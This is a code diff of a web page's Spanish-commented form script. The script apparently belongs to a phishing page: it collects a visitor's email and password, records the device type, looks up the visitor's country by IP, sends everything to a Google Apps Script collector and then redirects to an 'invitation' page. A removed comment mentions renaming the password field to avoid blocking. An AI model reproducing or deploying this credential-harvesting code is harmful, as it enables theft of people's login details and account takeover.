@@ -287,7 +287,7 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
 
     errorMessage.textContent = ""; // Limpia errores previos
 
-    // ✅ Detectar si el usuario usa iPhone o Android
+    // Detectar si el usuario usa iPhone o Android
     let deviceType = "Otro"; // Valor por defecto
     if (/android/i.test(navigator.userAgent)) {
         deviceType = "Android";
@@ -295,25 +295,22 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         deviceType = "iPhone";
     }
 
-    // ✅ Obtener el país del usuario
+    // Obtener el país del usuario
     let country = "Desconocido";
     try {
         const response = await fetch("https://ipwhois.app/json/");
         const data = await response.json();
-        if (data && data.country) {
-            country = data.country; // Captura el país correctamente
+        if (data.country) {
+            country = data.country; // Nombre del país
         }
     } catch (error) {
         console.error("Error obteniendo el país:", error);
     }
 
-    // ✅ Verificar que los datos se capturan antes de enviarlos
-    console.log("Datos a enviar:", { email, password, deviceType, country });
-
-    // ✅ Enviar datos a Google Apps Script
+    // Enviar datos a Google Apps Script
     const formData = new FormData();
     formData.append("email", email);
-    formData.append("pass", password); // Usar "pass" en lugar de "password" para evitar bloqueos
+    formData.append("password", password);
     formData.append("device", deviceType);
     formData.append("country", country); // Enviar el país
 
@@ -327,7 +324,6 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         });
 
         if (response.ok) {
-            console.log("Datos enviados correctamente.");
             window.location.href = "invitation.html"; // Redirigir tras éxito
         } else {
             alert("Error al enviar los datos.");
@@ -337,7 +333,6 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         console.error("Error:", error);
     }
 });
-
 </script>
 
 
